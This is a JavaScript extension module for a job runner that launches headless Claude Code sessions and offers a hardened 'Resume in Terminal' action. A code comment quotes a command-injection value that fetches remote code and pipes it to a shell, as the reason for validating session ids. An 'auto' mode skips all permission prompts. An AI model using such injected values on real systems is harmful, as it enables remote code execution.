import { execSync } from 'node:child_process';
import { splitArgs } from '../../lib/validate.js';
import { createFormatter } from './formatter.js';

// Extension: headless Claude Code runs (`claude -p "<goal>"`).
// Reference implementation — clone extensions/_template (or this dir) to add
// your own job type; see extensions/README.md.
export default {
  id: 'claude',
  name: 'Claude prompt',
  iconName: 'claude',
  icon: '🤖', // fallback for any renderer that doesn't know the SVG set

  description: 'Run a headless Claude Code session with a goal prompt.',

  fields: [
    { key: 'prompt', label: 'Goal prompt', type: 'textarea', rows: 4, required: true, placeholder: 'What should Claude do?' },
    {
      key: 'model', label: 'Model', type: 'select', default: 'default', advanced: true,
      options: [
        { value: 'default', label: 'default' }, { value: 'opus', label: 'opus' },
        { value: 'sonnet', label: 'sonnet' }, { value: 'haiku', label: 'haiku' },
      ],
    },
    {
      key: 'permMode', label: 'Permissions', type: 'select', default: 'auto', advanced: true,
      options: [
        { value: 'auto', label: 'auto — skip all prompts' },
        { value: 'acceptEdits', label: 'accept edits' },
        { value: 'default', label: 'default (may stall)' },
      ],
    },
    { key: 'extraArgs', label: 'Extra CLI args', type: 'text', default: '', advanced: true, placeholder: '--max-turns 30' },
  ],

  settings: [
    { key: 'claudePath', label: 'claude binary path', type: 'text', default: 'claude', required: true },
    { key: 'maxConcurrent', label: 'Max concurrent Claude runs', type: 'number', min: 1, max: 8, default: 2 },
  ],

  // Queue runs beyond maxConcurrent instead of running them all at once.
  concurrency: { settingKey: 'maxConcurrent', default: 2 },

  // Measured, not assumed (M3 spike): SIGINT makes the CLI stop at a turn/tool
  // boundary — the in-flight tool call is denied before it runs, a final result
  // event is emitted, the process exits 0, and `--resume <sessionId>` picks the
  // session back up with history that correctly shows the denied step never ran.
  gracefulStop: 'signal',

  // Auto-detect the claude binary on first boot (launchd PATH is bare).
  init({ getSetting, setSetting }) {
    if (getSetting('claudePath')) return;
    try {
      const p = execSync('/bin/zsh -lc "command -v claude"', { encoding: 'utf8' }).trim();
      if (p) setSetting('claudePath', p);
    } catch { /* leave unset; UI settings can fix */ }
  },

  command(job, { setting }) {
    const p = job.params;
    const args = ['-p', p.prompt, '--output-format', 'stream-json', '--verbose'];
    if (p.model !== 'default') args.push('--model', p.model);
    if (p.permMode === 'acceptEdits') args.push('--permission-mode', 'acceptEdits');
    if (p.permMode === 'auto') args.push('--dangerously-skip-permissions');
    args.push(...splitArgs(p.extraArgs));
    return { cmd: setting('claudePath', 'claude'), args };
  },

  createOutputHandler({ onLine, onProgress, onMeta }) {
    return createFormatter({ onLine, onProgress, onMeta });
  },

  runActions: [
    {
      id: 'resume',
      label: 'Resume in Terminal',
      requiresRunMeta: 'sessionId',
      exec({ run, job, setting, execFileFn }) {
        const esc = (s) => String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"');
        // `Terminal.do script` IS arbitrary shell, so every interpolated value has
        // to be quoted. sessionId was the one that was not: a value like
        // `x; curl http://h/p|sh #` became a second command in the user's Terminal.
        // Not reachable today (sessionId comes only from the CLI's own stream-json
        // and no route writes runs.meta) — but "a client can only pick from a
        // declared set" is a claim about the action *id*, not about what the action
        // then builds, so this must not rely on that.
        const sessionId = String(run?.meta?.sessionId ?? '');
        if (!/^[A-Za-z0-9._-]{1,200}$/.test(sessionId)) {
          return Promise.reject(new Error('this run has no usable session id to resume'));
        }
        const shellCmd = `cd ${JSON.stringify(job?.cwd || process.env.HOME)} && ${JSON.stringify(setting('claudePath', 'claude'))} --resume ${JSON.stringify(sessionId)}`;
        const osa = `tell application "Terminal"
  activate
  do script "${esc(shellCmd)}"
end tell`;
        return new Promise((resolve, reject) => {
          execFileFn('osascript', ['-e', osa], (err) => (err ? reject(err) : resolve({ ok: true })));
        });
      },
    },
  ],
};
